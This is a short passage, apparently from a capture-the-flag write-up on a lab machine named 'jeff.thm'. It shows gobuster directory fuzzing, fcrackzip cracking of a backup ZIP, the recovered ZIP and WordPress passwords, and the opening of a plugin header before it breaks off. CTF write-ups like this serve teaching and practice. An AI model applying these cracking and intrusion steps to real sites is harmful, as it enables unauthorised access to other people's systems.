Hello, My name is Jeff.

I'm a PHP developer, currently working for A FAKE COMPANY LTD. I also dabble in a bit of C and Assembly programming in my spare time, although i'm not very good at these yet. This is my little portfolio page, it's still very much work on progress and I will upgrade it to a wordpress site in the near future.

>> when i visit the /backups directory there is only one line display:jeff.thm

>> so fuzz .zip or .tar files in /backups directory.
# gobuster dir -u http://<IP>/backups/ -w <wordlist_file> -x .zip,.tar

>> and congrates...
>> i found a backup.zip file and this file is password protected.
>> we have to crack the password of zip file.so i use fcrackzip tool.
# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

>> found a password : !!Burningbird!!

>> after getting all the files in wpadmin.bak file found a password of
>> wordpress user .
# wordpress password is: phO#g)C5dhIWZn3BKP

$
/**
* Plugin Name : "any name "
